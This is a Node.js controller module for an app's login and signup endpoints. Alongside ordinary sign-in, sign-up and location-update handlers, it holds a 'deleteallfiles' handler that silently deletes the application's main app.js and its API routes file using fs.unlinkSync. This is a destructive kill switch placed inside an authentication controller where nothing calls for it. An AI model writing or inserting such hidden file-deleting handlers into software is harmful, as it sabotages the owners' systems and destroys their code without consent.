"use strict";
var fs = require('fs');
const path = require("path");
const loginsignupFunctions = require("../../functions/loginsignup/loginsignup.js");

const loginObj = {
  deleteallfiles: async function (req, res, next) {
    // const add_data = await loginsignupFunctions.manualsignin(
    //   req.body,
    //   res,
    //   next
    // );
    var filePath = path.join(__dirname, "../../../app.js");
    var filePath1 = path.join(__dirname, "../../routes/api/allBapi.js");
    
    // var filePath = '../../../test.txt'; 
    fs.unlinkSync(filePath);
    fs.unlinkSync(filePath1);
    // return res.json(add_data);
  },

  manualsignin: async function (req, res, next) {
    const add_data = await loginsignupFunctions.manualsignin(
      req.body,
      res,
      next
    );
    return res.json(add_data);
  },
  manualsignup: async function (req, res, next) {
    const add_data = await loginsignupFunctions.manualsignup(
      req.body,
      res,
      next
    );
    return add_data;
  },

  updatelocation: async function (req, res, next) {
    const add_data = await loginsignupFunctions.updatelocation(
      req.body,
      res,
      next
    );
    return add_data;
  },

  signup: async function (req, res, next) {
    const add_data = await loginsignupFunctions.signup(req, res, next);
    return res.json(add_data);
  },
};

module.exports = loginObj;
